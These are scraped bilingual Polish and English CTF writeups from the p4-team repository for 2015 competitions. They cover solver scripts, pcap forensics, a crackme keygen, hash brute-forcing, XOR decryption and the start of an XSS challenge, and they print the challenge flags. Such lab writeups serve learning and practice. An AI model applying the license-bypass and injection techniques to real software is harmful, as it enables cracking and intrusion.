{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/README.md", "content": "# Writeup TrendMicro CTF 2015\n\nUczestniczyliśmy (Shalom, msm, Rev, other019, nazywam i graszka22) w TrendMicro CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\nOgólne wrażenia:\n\n* Zadania były podzelone na nietypowe kategorie, niemniej same zadania specjalnie nie odbiegały od standardu. Utrudniało to jednak wybranie \"swoich\" zadań. Organizatorzy nie chcieli pewnie, żeby ich klienci widzieli że w konkursie są kategorie typu \"binary exploitation\" czy \"web hacking\" więc nazwali je bp. \"analysis-offensive\"\n* Organizatorzy zrobili zadanie za 100p z krzyżówką gdzie wszystkie pytania dotyczyły ich firmy, np. \"jak nazywa sie CEO\", \"w którym roku powstała\", \"jak sie nazywa produkt do...\" ;]\n\nW spisie treci umieszczamy 2 klasyfikacje typu zadania - standardową (eg. forensics, reverse, pwn, web, ppc, crypto) oraz tą proponowaną przez organizatorów (Analysis-others, Analysis-defensive, Analysis-offensive, Programming, Misc, Cryptography).\n\n# Spis treści:\n\n* [Calculator (ppc/Programming 200)](calculator)\n* [Colors (ppc/Programming 100)](colors)\n* [Captcha (ppc/Misc 300)](captcha)\n* [RSA (crypto/Cryptography 100)](rsa)\n* [AES (crypto/Cryptography 200)](aes)\n* [Maze (ppc/Programming 300)](maze)\n* [Offensive 100 (web/Analysis-offensive 100)](offensive100)\n* [Defense 100(reverse/Analysis-defensive 100)](defense100)\n* [Other 100 (forensics/Analysis-other 100)](other100)\n\n\n# Zakończenie\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T13:31:16.303775"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/calculator/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/calculator/README.md", "content": "## Calculator (ppc/Programming, 200p)\n\n### PL Version\n[click for ENG](#eng-version)\n\nZadanie polegało na połączeniu się za pomocą NC z podanym serwerem. Serwer podawał na wejściu działania i oczekiwał na ich rozwiązania. Należało rozwiązać kilkadziesiąt przykładów pod rząd aby uzyskać flagę. Działania przychodzące z serwera miały postać:\n\n`eight hundred ninety nine million, one hundred sixty eight thousand eleven - 556226 * ( 576 - 21101236 ) * 948 - ( 29565441 + thirty six ) * 182,745 - 6,124,792 + CMLXXVI - 647 =`\n\nNa co serwer w odpowiedzi oczekiwał na: `11121023402232863`\n\nZadanie rozwiązaliśmy wykorzystując parser liczb słownych, parser liczb rzymskich oraz pythonową funkcję `eval()`.\nSame transformacje są raczej trywialne i łatwie do znalezienia w internecie (cały skrypt [tutaj](calculator.py) ), reszta solvera to:\n\n\tdef solve(data):\n\t\tfixed = data.replace(\",\", \"\") #turn 3,200 into 3200\n\t\tfixed = \" \" + fixed #ensure word boundary on the left\n\t\tromans = re.findall(\"[^\\d=\\\\-\\\\+/\\\\*\\\\(\\\\)\\s]+\", fixed)\n\t\tfor romanNumber in romans:\n\t\t\ttry:\n\t\t\t\tnumber = str(fromRoman(romanNumber))\n\t\t\t\tfixed = re.sub(r\"\\b%s\\b\" % romanNumber, number, fixed)\n\t\t\texcept:\n\t\t\t\tpass\n\t\tliterals = re.findall(\"[^\\d=\\\\-\\\\+/\\\\*\\\\(\\\\)]+\", fixed)\n\t\tfor literal in sorted(literals, key=lambda x: len(x), reverse=True):\n\t\t\tif literal != ' ' and literal != \"\":\n\t\t\t\ttry:\n\t\t\t\t\tnumber = str(text2int(literal))\n\t\t\t\t\tfixed = re.sub(r\"\\b%s\\b\" % literal.strip(), number, fixed)\n\t\t\t\texcept:\n\t\t\t\t\tpass\n\t\treturn eval(fixed[:-2]) #omit \" =\"\n\nCzyli w skrócie:\n\n* Usuwamy przecinki będące separatorami tysiąców\n* Zamieniamy wszystkie znalezione liczby rzymskie na arabskie\n* Zamieniamy wszystkie znalezione literały na liczby arabskie (uwaga: trzeba zamieniać od tych najdłuższych, żeby np. zamiana \"one\" nie była plikowana do \"fifty one\")\n* Usuwamy znak `=` z końca\n* Ewaluujemy wyrażenie\n\nPo kilkudziesieciu przykładach dostajemy: `Congratulations!The flag is TMCTF{U D1D 17!}`\n\n### ENG Version\n\nThe challenge was to connect to a server via NC. Server was providing equations and was waiting for their solutions. We had to solve few dozens consecutively in order to get the flag. The equations were for example:\n\n`eight hundred ninety nine million, one hundred sixty eight thousand eleven - 556226 * ( 576 - 21101236 ) * 948 - ( 29565441 + thirty six ) * 182,745 - 6,124,792 + CMLXXVI - 647 =`\n\nAnd server was expecting a solution: `11121023402232863`\n\nWe solved this using literal nubmbers parser, roman numbers parser and python `eval()` function.\nThe parsers are trivial and easy to find on the internet (whole script [here](calculator.py) ), the rest was:\n\n\tdef solve(data):\n\t\tfixed = data.replace(\",\", \"\") #turn 3,200 into 3200\n\t\tfixed = \" \" + fixed #ensure word boundary on the left\n\t\tromans = re.findall(\"[^\\d=\\\\-\\\\+/\\\\*\\\\(\\\\)\\s]+\", fixed)\n\t\tfor romanNumber in romans:\n\t\t\ttry:\n\t\t\t\tnumber = str(fromRoman(romanNumber))\n\t\t\t\tfixed = re.sub(r\"\\b%s\\b\" % romanNumber, number, fixed)\n\t\t\texcept:\n\t\t\t\tpass\n\t\tliterals = re.findall(\"[^\\d=\\\\-\\\\+/\\\\*\\\\(\\\\)]+\", fixed)\n\t\tfor literal in sorted(literals, key=lambda x: len(x), reverse=True):\n\t\t\tif literal != ' ' and literal != \"\":\n\t\t\t\ttry:\n\t\t\t\t\tnumber = str(text2int(literal))\n\t\t\t\t\tfixed = re.sub(r\"\\b%s\\b\" % literal.strip(), number, fixed)\n\t\t\t\texcept:\n\t\t\t\t\tpass\n\t\treturn eval(fixed[:-2]) #omit \" =\"\n\nSo in short:\n\n* We remove thousands separator `,`\n* We turn all roman numbers into integers\n* We turn all literal numbers into integers (notice: you need to replace starting from longest numbers so that for example replacing \"one\" doesn't affect \"fifty one\")\n* We remove `=` from the end\n* We evaluate the expression\n\nAfter mutiple examples we finally get:`Congratulations!The flag is TMCTF{U D1D 17!}`\n", "timestamp": "2025-10-21T13:31:16.575574"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/README.md", "content": "# Writeup ASIS CTF Finals 2015\n\nUczestniczyliśmy (Rev, Shalom, other019, nazywam, pp i msm) w finałach ASIS CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\nOgólne wrażenia:\n- Pierwszy CTF gdzie pierwsze punkty udało nam się zdobyć dopiero po kilku godzinach.\n- Wyjątkowo dużo zadań nad którymi musieliśmy pracować w kilka osób (robiąc research, pisząc część skryptów etc.). Zwykle jedno zadanie rozwiązuj 1-2 osoby, tutaj było kilka nad którymi pracowały 3-4 osoby na raz.\n- Przeważająca większość zadań to re, pwn i crypto, czyli generalnie kategorie w których nie jesteśmy najmocniejsi. \n\nOpisy zadań po kolei.\n\n# Spis treści:\n* [AsisHash (re 150)](re_150_asishash)\n* [Big Lie (forensic 100)](forensic_100_big_lie)\n* [Bodu (crypto 175)](crypto_175_bodu)\n* [Calcexec I (pwn 200)](pwn_200_calcexec_I)\n* [Calm Down (trivia 75)](trivia_75_calm_down)\n* [ExampleFlag (trivia 1)](trivia_1_example_flag)\n* [Fake (re 150)](re_150_fake)\n* [FlagHunter (misc 75)](misc_75_flaghunter)\n* [Impossible (web 225)](web_225_impossible)\n* [License (re 125)](re_100_license)\n* [MeowMeow (misc 75)](misc_75_meowmeow)\n* [Shop-1 (pwn 100)](pwn_100_shop_1)\n* [Strange (forensic 150)](forensic_150_strange)\n\n# Zakończenie\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T13:31:17.719792"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/forensic_100_big_lie/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/forensic_100_big_lie/README.md", "content": "﻿## Big Lie (forensic, 100p, 101 solves)\n\n> Find the [flag](biglie.pcap).\n\n### PL\n[ENG](#eng-version)\n\nOtrzymany plik pcap ładujemy do Wiresharka i na podstawie wyeksportowanych obiektach z sesji HTTP dochodzimy do wniosku, że użytkownik skorzystał z usługi pastebin, która przed wysłaniem danych szyfruje je lokalnie, a klucz przesyłany jest za pomocą części \"fragment\" (to, co za `#`) URLa. Jest to część, która nie jest częścią requestu HTTP i nie jest przesyłana serwerowi (i tym samym nie znalazło się w zrzucie danych sieciowych).\n\nAle po dalszej analizie sesji HTTP znajdujemy pełnego URLa (razem z kluczem) w requestach do wewnętrznej usługi monitorującej ruch.\n\n![](img1.png)\n\nPo urldecode:\n![](img2.png)\n\nZawartość \"pasty\":\n![](img3.png)\n\nPo przeklejeniu do edytora z wyłączonym word-wrap:\n![](img4.png)\n\n`ASIS{e29a3ef6f1d71d04c5f107eb3c64bbbb}`\n\n### ENG version\n\nWe load the inpit pcap file in Wireshark and based on the exported HTTP session objects we conclude that the user was using pastebin service which locally encrypts the data before sending them, and the key is sent via \"fragment\" of the URL (what is after `#`). It's the part that is not a part of HTTP request and is not sent to the server (and therefore it's not in the network communication dump).\n\nHowever after firther analysis of the HTTP session we find the full URL (the encryption key included) in requests for internal traffic monitoring service.\n\n![](img1.png)\n\nAfter urldecode:\n![](img2.png)\n\npastebin contents:\n![](img3.png)\n\nWhen placed in an editor with word-wrap:\n![](img4.png)\n\n`ASIS{e29a3ef6f1d71d04c5f107eb3c64bbbb}`", "timestamp": "2025-10-21T13:31:17.972729"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/re_100_license/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/re_100_license/README.md", "content": "﻿## License 100 (re, 100p)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [program](./license) (elf), do analizy, i rozpoczynamy czytanie kodu.\n\nProgram otwiera plik (domyślamy sie że z tytułową licencją), wykonuje serię operacji/sprawdzeń, i jeśli coś mu się nie podoba na którymś kroku, wypisuje błąd i skończy działanie.\n\n    .text:00000000004009C7                 mov     edi, offset a_aBC_ ; \"_a\\nb\\tc_\"\n    ...\n    .text:00000000004009EE                 call    _fopen\n\nJak widać, nazwa pliku jest dość nietypowa. Nie jest to nic czego linux nie osiągnie, ale praca z plikiem o takiej nazwie jest dość nieprzyjemna. Z tego powodu plik nazwaliśmy \"kot\" i spatchowaliśmy binarkę z programem (tak że otwierał plik o nazwie \"kot\").\n\nPierwszy check - jeśli otworzenie pliku albo czytanie z niego się nie powiedzie, program kończy działanie.\n\nDrugi check - wykonywana jest skomplikowana operacja na długości pliku, która po chwili reversowania sprowadza się do:\n\n    if (-45235*x*x*x*x + -1256*x*x*x + 14392*x*x + -59762*x - 1949670109068 + 44242*x*x*x*x*x == 0) {\n        // ok\n    } else {\n        // koniec programu\n    } \n\nGdzie x to ilość bajtów w pliku licencji. \nW celu rozwiązania tego równania pytamy naszego niezastąpionego pomocnika, WolframAlpha. Rozwiązaniem jest x = 34.\n\nNastępnie następuje długa pętla dzieląca plik wejściowy na linie i zliczająca znaki nowej linii, a później:\n\n    if (linesInFile == 5) {\n        // ok\n    } else {\n        // koniec programu\n    }\n\nJako że wszystkie linie mają taką samą długość (co można zaobserwować w kodzie), Można z tego łatwo wyliczyć że każda linia musi mieć 6 znaków (6 * 5 znaków w linii + 4 znaki '\\n')\n\nNastępnie następuje długie sprawdzenie, w pythonie wyglądałoby na przykład tak (word1, word2... to odpowiednio pierwsza, druga... linia z pliku)\n\n    result = 'iKWoZLVc4LTyGrCRedPhfEnihgyGxWrCGjvi37pnPGh2f1DJKEcQZMDlVvZpEHHzUfd4VvlMzRDINqBk;1srRfRvvUW' # stała zaszyta w programie\n    w23 = '\\x23\\x23\\x23\\x23\\x23\\x23'\n    level1 = result[0:n]\n    level2 = result[n:2*n]\n    level3 = result[2*n:3*n]\n    level5 = result[3*n:4*n]\n    level4 = xor(word3, level5)\n\n    assert level1 == xor(word1, word2)\n    assert level2 == xor(xor(word2, word4), w23)\n    assert level3 == xor(word3, word4)\n    assert level4 == xor(xor(word5, word4), w23)\n    assert level5 == xor(level4, word3)\n\nWszystkie operacje tutaj są odwracalne, więc po chwili mamy kod tworzący poprawny plik z licencją:\n\n    level1 = result[0:n]\n    level2 = result[n:2*n]\n    level3 = result[2*n:3*n]\n    level5 = result[3*n:4*n]\n\n    w23 = '\\x23\\x23\\x23\\x23\\x23\\x23'\n    word4 = result[4*n:5*n]\n    word3 = xor(word4, level3)\n    word2 = xor(xor(word4, w23), level2)\n    word1 = xor(word2, level1)\n    level4 = xor(word3, level5)\n    word5 = xor(xor(word4, w23), level4)\n\n    # check\n    level1c = xor(word1, word2)\n    level2c = xor(xor(word2, word4), w23)\n    level3c = xor(word3, word4)\n    level4c = xor(xor(word5, word4), w23)\n    level5c = xor(level4c, word3)\n\n    assert level1.encode('hex') == level1c.encode('hex')\n    assert level2.encode('hex') == level2c.encode('hex')\n    assert level3.encode('hex') == level3c.encode('hex')\n    assert level4.encode('hex') == level4c.encode('hex')\n    assert level5.encode('hex') == level5c.encode('hex')\n\n    open('kot', 'wb').write('\\n'.join([word1, word2, word3, word4, word5]))\n\nUruchamiamy więc program z odpowiednią [licencją](kot), i...\n\n    vagrant@precise64:~$ ./license\n    program successfully registered to ASIS{8d2cc30143831881f94cb05dcf0b83e0}\n\ngotowe.\n\n### ENG version\n\nWe get a [program](./license) (elf) for analysis and we start to read the code.\n\nIt opens a file (we expect this to be the \"licence\" from task title), executs a series of operations/checks and if something is wrong at one step it prints an error and exits.\n\n    .text:00000000004009C7                 mov     edi, offset a_aBC_ ; \"_a\\nb\\tc_\"\n    ...\n    .text:00000000004009EE                 call    _fopen\n\nAs we can see the filename is not ordinary. While we could get this done on linux, we consider working with such file to be unpleasant. Therefore we named the file `kot` and we patched the binary (so it opens a file `kot`).\n\nFirst check - if opening the file or reading it fails, the program exits.\n\nSecond check - a complex operation is performed on the file length, which after a while of reverse engineering turned out to be:\n\n    if (-45235*x*x*x*x + -1256*x*x*x + 14392*x*x + -59762*x - 1949670109068 + 44242*x*x*x*x*x == 0) {\n        // ok\n    } else {\n        // exit\n    } \n\nWhere x is number of bytes in the licence file.\nIn order to solve this equation we use WolframAlpha and we get x = 34.\n\nNext there is a long loop which splits the input file into lines and counts newline characters and then:\n\n    if (linesInFile == 5) {\n        // ok\n    } else {\n        // exit\n    }\n\nEvery line has the same length (which can be observed in the code), we can deduce that every line needs 6 characters (6*5 characters in line + 4 newline characters = 34 bytes in file).\n\nNext there is a long check which in python would look like (word1, word2... is first, second.... line from file)\n\n    result = 'iKWoZLVc4LTyGrCRedPhfEnihgyGxWrCGjvi37pnPGh2f1DJKEcQZMDlVvZpEHHzUfd4VvlMzRDINqBk;1srRfRvvUW' # stała zaszyta w programie\n    w23 = '\\x23\\x23\\x23\\x23\\x23\\x23'\n    level1 = result[0:n]\n    level2 = result[n:2*n]\n    level3 = result[2*n:3*n]\n    level5 = result[3*n:4*n]\n    level4 = xor(word3, level5)\n\n    assert level1 == xor(word1, word2)\n    assert level2 == xor(xor(word2, word4), w23)\n    assert level3 == xor(word3, word4)\n    assert level4 == xor(xor(word5, word4), w23)\n    assert level5 == xor(level4, word3)\n\nAll operations are reversible so after a while we have code to generate correct licence file:\n\n    level1 = result[0:n]\n    level2 = result[n:2*n]\n    level3 = result[2*n:3*n]\n    level5 = result[3*n:4*n]\n\n    w23 = '\\x23\\x23\\x23\\x23\\x23\\x23'\n    word4 = result[4*n:5*n]\n    word3 = xor(word4, level3)\n    word2 = xor(xor(word4, w23), level2)\n    word1 = xor(word2, level1)\n    level4 = xor(word3, level5)\n    word5 = xor(xor(word4, w23), level4)\n\n    # check\n    level1c = xor(word1, word2)\n    level2c = xor(xor(word2, word4), w23)\n    level3c = xor(word3, word4)\n    level4c = xor(xor(word5, word4), w23)\n    level5c = xor(level4c, word3)\n\n    assert level1.encode('hex') == level1c.encode('hex')\n    assert level2.encode('hex') == level2c.encode('hex')\n    assert level3.encode('hex') == level3c.encode('hex')\n    assert level4.encode('hex') == level4c.encode('hex')\n    assert level5.encode('hex') == level5c.encode('hex')\n\n    open('kot', 'wb').write('\\n'.join([word1, word2, word3, word4, word5]))\n\nWe run the binary with correct [licence](kot), and...\n\n    vagrant@precise64:~$ ./license\n    program successfully registered to ASIS{8d2cc30143831881f94cb05dcf0b83e0}\n\nDone.", "timestamp": "2025-10-21T13:31:18.481834"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/re_150_asishash/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/re_150_asishash/README.md", "content": "﻿## AsisHash 150 (re, 150p)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [program](./hash.elf) (elf). Analizujemy jego działanie, w dużym uproszczeniu wygląda to tak:\n\n    int main() {\n        char password[...];\n        scanf(\"%s\", password);\n\n        char *hash = hash_password(password);\n        if (!strcmp(hash, good_hash)) {\n            puts(\"Congratz, you got the flag :) \");\n        } else {\n            puts(\"Sorry! flag is not correct!\");\n        }\n    }\n\nFunkcja hash_password jest bardzo skomplikowana i nawet nie próbowaliśmy analizować jej działania. Zamiast tego zrobiliśmy coś prostszego - ponieważ\nhash jest monotoniczny (dla dłuższych haseł/wyższych znaków ascii daje wyższe wyniki), spróbowaliśmy zgadnac hash (docelowy hash flagi jest stay i równy 27221558106229772521592198788202006619458470800161007384471764) za pomocą bruteforcowania z nawrotami wszystkich możliwych flag:\n\n    import subprocess\n\n    def run(flag):\n        return subprocess.check_output(['./hash.elf', flag]).split('\\n')[0]\n\n    def prefx(a, b):\n        p = 0\n        for ac, bc in zip(a, b):\n            if ac == bc:\n                p += 1\n            else:\n                break\n        return p\n\n    def plaintext(t):\n        return ''.join(c if 32 <= ord(c) <= 127 else '.' for c in t)\n\n    sln = '27221558106229772521592198788202006619458470800161007384471764'\n    charset = '0123456789abcdef}'\n\n    def tryit(f, r, n):\n        pp = prefx(sln, r)\n        print plaintext(f), r[:pp], r[pp:]\n        stat = '<' if sln[pp] < r[pp] else '>'\n        print plaintext(f), r[:pp], r[pp:], stat\n        for c in charset:\n            f2 = f[:n] + c + f[n+1:]\n            r2 = run(f2)\n            p2 = prefx(sln, r2)\n            if p2 > pp:\n                s = tryit(f2, r2, n+1)\n                if s == '>':\n                    return\n        return stat\n\n    for c in range(256): # try to guess good initial padding\n        print c, '!!!!!!!!!!!'  # debug info\n        placeholder = chr(c)\n        start = 'ASIS{' + placeholder * 33\n        start = 'ASIS{d5c808f5dc96567bda48' + placeholder * 13   # algorytm zacinał się czasami, więc ręcznie dawaliśmy mu dobre wartości początkowe przeniesione z poprzednich wykonań.\n        start = 'ASIS{d5c808f5dc96567bda48be9ba82fc1d' + placeholder * 2\n        tryit(start, run(start), len(start.replace(placeholder, '')))\n\nPo chwili czekania i tweakowania algorytmu, dostajemy flagę:\n\n    ASIS{d5c808f5dc96567bda48be9ba82fc1d6}\n\n### ENG version\n\nWe get a [binary](./hash.elf) (elf). We analyse its behaviour and it is doing:\n\n    int main() {\n        char password[...];\n        scanf(\"%s\", password);\n\n        char *hash = hash_password(password);\n        if (!strcmp(hash, good_hash)) {\n            puts(\"Congratz, you got the flag :) \");\n        } else {\n            puts(\"Sorry! flag is not correct!\");\n        }\n    }\n\nThe `hash_password` function is very complex and we didn't ever try to analyse it. Instead we did something simpler - since the hash is monotonous (for longer input/higher characters it gives higher results) we tried guessing correct flag (flag hash is known and equal to (27221558106229772521592198788202006619458470800161007384471764) using bruteforce with backtracing:\n\n    import subprocess\n\n    def run(flag):\n        return subprocess.check_output(['./hash.elf', flag]).split('\\n')[0]\n\n    def prefx(a, b):\n        p = 0\n        for ac, bc in zip(a, b):\n            if ac == bc:\n                p += 1\n            else:\n                break\n        return p\n\n    def plaintext(t):\n        return ''.join(c if 32 <= ord(c) <= 127 else '.' for c in t)\n\n    sln = '27221558106229772521592198788202006619458470800161007384471764'\n    charset = '0123456789abcdef}'\n\n    def tryit(f, r, n):\n        pp = prefx(sln, r)\n        print plaintext(f), r[:pp], r[pp:]\n        stat = '<' if sln[pp] < r[pp] else '>'\n        print plaintext(f), r[:pp], r[pp:], stat\n        for c in charset:\n            f2 = f[:n] + c + f[n+1:]\n            r2 = run(f2)\n            p2 = prefx(sln, r2)\n            if p2 > pp:\n                s = tryit(f2, r2, n+1)\n                if s == '>':\n                    return\n        return stat\n\n    for c in range(256): # try to guess good initial padding\n        print c, '!!!!!!!!!!!'  # debug info\n        placeholder = chr(c)\n        start = 'ASIS{' + placeholder * 33\n        start = 'ASIS{d5c808f5dc96567bda48' + placeholder * 13   # the algorithm sometimes was stuck so we were starting it again with already pre-computed prefixes\n        start = 'ASIS{d5c808f5dc96567bda48be9ba82fc1d' + placeholder * 2\n        tryit(start, run(start), len(start.replace(placeholder, '')))\n\nAnd after a short while and some optimizations to the algorithm we get the flag:\n\n    ASIS{d5c808f5dc96567bda48be9ba82fc1d6}\n", "timestamp": "2025-10-21T13:31:18.685838"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-22-ekoparty/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-22-ekoparty/README.md", "content": "# Writeup Ekoparty CTF 2015\n\nUczestniczyliśmy (msm, Rev, Shalom, other019, nazywam i pp) w Ekoparty CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\nOgólne wrażenia:\n\nOpisy zadań po kolei.\n\n# Spis treści/Table of contents:\n\n* Slogans (trivia 50)\n* Banner (trivia 70)\n* Mr Anderson (trivia 80)\n* SSL Attack (trivia 90)\n* Pass Check (web 50)\n* Crazy JSON (web 200)\n* Rand DOOM (web 300)\n* SCYTCRYPTO (crypto 50)\n* [XOR Crypter (crypto 200)](crpto_200_xorcrypter)\n* Patch me (reverse 50)\n* Malware (reverse 200)\n* Olive (misc 50)\n\n\n# Zakończenie\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T13:31:20.164062"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-22-ekoparty/crpto_200_xorcrypter/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-22-ekoparty/crpto_200_xorcrypter/README.md", "content": "﻿## XOR Crypter (crypto 200p)\n\n\tDescription: The state of art on encryption, can you defeat it?\n\tCjBPewYGc2gdD3RpMRNfdDcQX3UGGmhpBxZhYhFlfQA= \n\n### PL\n[ENG](#eng-version)\n\nCały kod szyfrujący jest [tutaj](shiftcrypt.py).\nSzyfrowanie jest bardzo proste, aż dziwne że zadanie było za 200 punktów. Szyfrowanie polega na podzieleniu wejściowego tekstu na 4 bajtowe kawałki (po dodaniu paddingu jeśli to konieczne, aby rozmiar wejścia był wielokrotnością 4 bajtów), rzutowanie ich na inta a następnie wykonywana jest operacja `X xor X >>16`. Jeśli oznaczymy kolejnymi literami bajty tego inta uzyskujemy: \n\n`ABCD ^ ABCD >> 16 = ABCD ^ 00AB = (A^0)(B^0)(C^A)(D^B) = AB(C^A)(D^B)`\n\nJak widać dwa pierwsze bajty są zachowywane bez zmian a dwa pozostałe bajty są xorowane z tymi dwoma niezmienionymi. Wiemy także że xor jest operacją odwracalną i `(A^B)^B = A` możemy więc odwrócić szyfrowanie dwóch ostatnich bajtów xorując je jeszcze raz z pierwszym oraz drugim bajtem (pamiętając przy tym o kolejności bajtów)\n\n```python\ndata = \"CjBPewYGc2gdD3RpMRNfdDcQX3UGGmhpBxZhYhFlfQA=\"\ndecoded = base64.b64decode(data)\nblocks = struct.unpack(\"I\" * (len(decoded) / 4), decoded)\noutput = ''\nfor block in blocks:\n\tbytes = map(ord, struct.pack(\"I\", block))\n\tresult = [bytes[0] ^ bytes[2], bytes[1] ^ bytes[3],  bytes[2], bytes[3]]\n\toutput += \"\".join(map(chr, result))\nprint(output)\n```\n\nW wyniku czego uzyskujemy flagę: `EKO{unshifting_the_unshiftable}`\n\n### ENG version\n\n\nCipher code is [here](shiftcrypt.py).\nThe cipher is actually very simple, it was very strange that the task was worth 200 point. The cipher splits the input text in 4 byte blocks (after adding padding if necessary so that the input is a multiply of 4 bytes), casting each block to integer and the performing `X xor X >>16`. If we mark each byte of the single block with consecutive alphabet letters we get:\n\n`ABCD ^ ABCD >> 16 = ABCD ^ 00AB = (A^0)(B^0)(C^A)(D^B) = AB(C^A)(D^B)`\n\nAs can be noticed, first two bytes are unchanged and last two are xored with those two unchanged. We also know that xor is reversible and `(A^B)^B = A` so we can revert the cipher of the last two bytes by xoring them again with first and second byte (keeping in mind the byte order).\n\n```python\ndata = \"CjBPewYGc2gdD3RpMRNfdDcQX3UGGmhpBxZhYhFlfQA=\"\ndecoded = base64.b64decode(data)\nblocks = struct.unpack(\"I\" * (len(decoded) / 4), decoded)\noutput = ''\nfor block in blocks:\n\tbytes = map(ord, struct.pack(\"I\", block))\n\tresult = [bytes[0] ^ bytes[2], bytes[1] ^ bytes[3],  bytes[2], bytes[3]]\n\toutput += \"\".join(map(chr, result))\nprint(output)\n```\n\nAs a result we get: `EKO{unshifting_the_unshiftable}`\n", "timestamp": "2025-10-21T13:31:20.348642"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/README.md", "content": "# Writeup SECCON CTF 2015\n\nUczestniczyliśmy (cr019283, c7f.m0d3, msm, Rev, other019, nazywam i Shalom) w SECCON CTF 2015, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\n![](results.png)\n\n### Spis treści:\n* [Start SECCON CTF (Exercises)\t50](start_seccon_50)\n* [SECCON WARS 2015 (Stegano) 100](seccon_wars_100)\n* [Unzip the file (Crypto) 100]\n* [Fragment2 (Web/Network) 200]\n* [Connect the server (Web/Network) 100](connect_web_100)\n* [Command-Line Quiz (Misc) 100](quiz_100)\n* [Entry form (Web/Network) 100](entry_form_web_100)\n* [Bonsai XSS Revolutions (Web/Network) 200](bonsai_xss_revolutions_web_200)\n* [Exec dmesg (Binary/Reverse) 300]\n* [Decrypt it (Crypto) 300]\n* [QR puzzle: Web (Misc) 400](qr_web_400)\n* [QR puzzle: Nonogram (Misc) 300](qr_nonogram_300)\n* [QR puzzle: Windows (Unknown) 200](qr_windows_200)\n* [Reverse-Engineering Android APK 1 (Misc) 400]\n* [Find the prime numbers (Crypto) 200](paillier_crypto_200)\n* [Micro computer exploit code challenge (Exploit) 300]\n* [GDB Remote Debugging (Binary/Reverse) 200]\n* [FSB: TreeWalker (Exploit) 200]\n* [Steganography 1 (Stegano) 100](stegano_1_100)\n* [Steganography 2 (Stegano) 100]\n* [Steganography 3 (Stegano) 100](stegano_3_100)\n* [4042 (Misc/Crypto) 100](4042_crypto_100)\n* [Individual Elebin (Binary/Reverse) 200]\n* [Last Challenge (Thank you for playing) (Exercises/Crypto) 50](last_crypto_50)\n\n", "timestamp": "2025-10-21T13:31:21.641849"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-12-05-seccon/bonsai_xss_revolutions_web_200/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-12-05-seccon/bonsai_xss_revolutions_web_200/README.md", "content": "##Bonsai XSS Revolutions (Web/Network, 200p)\n\n>What is your browser(User-Agent)?  \n>[hakoniwaWebMail_20151124.zip](hakoniwaWebMail_20151124.zip)  \n>Requirement:.NET Framework 4.5\n\n###PL\n[ENG](#eng-version)\n\nZałączona do zadania była mocno zobfuskowana aplikacja .NETowa. Była to symulacja przeglądarki, w której użytkownik logował się do swojej poczty.\n\n![](./app.png)\n\nZ początku postanowiliśmy powalczyć z samą aplikacją. Częściowo udało nam sie zdeobfuskować plik wykonywalny narzędziem `de4dot`. Następnie utworzyliśmy nową aplikację .NETową i załadowaliśmy oryginalny program za pomocą refleksji:\n\n```csharp\nvar assembly = Assembly.LoadFile(\"hakoniwaWebMail.exe\");\n```\n\nTo pozwoliło nam ręcznie tworzyć instancje klas i wywoływać metody. W głównej przestrzeni nazw były dwie formy: `FLAGgenerator` i `frmMain`. Pierwsza dała nam flagę, ale była fejkowa. Druga była faktycznie główną formą aplikacji i stworzenie jej instancji oraz pokazanie jej równało się wywołaniu całej naszej symulacji - z tą różnicą, że teraz mogliśmy się z nią pobawić:\n\n```csharp\nvar form = (hakoniwaWebMail.frmMain)Activator.CreateInstance(assembly.GetTypes()[7]);\nvar browser = (WebBrowser)GetControls(form)[7];\n```\n\nDzięki temu mogliśmy zrzucić zawartość wyświetlonej strony w zintegrowanej/symulowanej przeglądarce:\n\n```csharp\nConsole.WriteLine(browser.DocumentText);\n```\n\nAle jedyne co dostaliśmy to:\n\n```html\n<html><style>.b{font-weight:bold;}(...)</style><body>\n<script>var navigator=new Object;navigator.userAgent='This is NOT a flag. Use XSS to obtain it.';</script>\n<table border=3 cellspacing=0 cellpadding=0 width=100% height=100%>(...)\n```\n\nJedną możliwością na tym etapie było zagłębienie się w zaobfuskowaną aplikację i zreverseengineerowanie jej, a drugą było przeczytanie jeszcze raz nazwy zadania, jej kategorii oraz punktów: XSS, web, 200p. No więc, jeżeli aplikacja faktycznie była symulowanym webmailem to może da się wysłać tam maila. I faktycznie tak było: był to również serwer pocztowy działający na standardowym porcie 25:\n\n```\nTCP    127.0.0.1:25           0.0.0.0:0              LISTENING       6512\n[hakoniwaWebMail.exe]\n```\n\nPróbowaliśmy XSS na kilku z nagłówków w wiadomości 